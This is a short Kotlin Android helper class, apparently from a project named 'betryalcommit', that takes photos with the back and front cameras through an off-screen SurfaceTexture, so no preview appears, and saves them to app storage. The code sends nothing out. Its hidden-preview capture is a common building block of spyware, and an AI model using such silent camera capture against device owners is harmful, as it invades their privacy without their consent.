package com.example.betryalcommit

import android.content.Context
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.util.Log
import java.io.File
import java.io.FileOutputStream

class CameraCaptureHelper {
    fun captureback(context: Context) {
        val fileName = "Camera_hmmmmmmmmmmmmmmm_${System.currentTimeMillis()}.png"
        val externalPicturesDir = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        val file = File(externalPicturesDir, fileName)

        val holder = SurfaceTexture(0)
        val camera = Camera.open(0) // Use camera index 0 for the back camera
        camera.setPreviewTexture(holder)
        camera.startPreview()
        camera.takePicture(
            null,
            null,
        ) { p0, p1 ->
            try {
                FileOutputStream(file).use { outputStream ->
                    outputStream.write(p0)
                }
                p1.release()

                // Log the path where the picture is saved
                val savedImagePath = file.absolutePath
                Log.d("CaptureImage", "Picture saved: $savedImagePath")
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                camera.release()
            }
        }
    }

    fun cpturefront(context: Context) {
        val fileName = "Camera_hmmmmmmmmmmmmmmm_${System.currentTimeMillis()}.png"
        val externalPicturesDir = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        val file = File(externalPicturesDir, fileName)

        val holder = SurfaceTexture(0)
        val camera = Camera.open(1)
        camera.setPreviewTexture(holder)
        camera.startPreview()
        camera.takePicture(
            null,
            null,
        ) { p0, p1 ->
            try {
                FileOutputStream(file).use { outputStream ->
                    outputStream.write(p0)
                }
                p1.release()

                // Log the path where the picture is saved
                val savedImagePath = file.absolutePath
                Log.d("CaptureSelfie", "Picture saved: $savedImagePath")
            } catch (e: Exception) {
                e.printStackTrace()
            } finally {
                camera.release()
            }
        }
    }


}
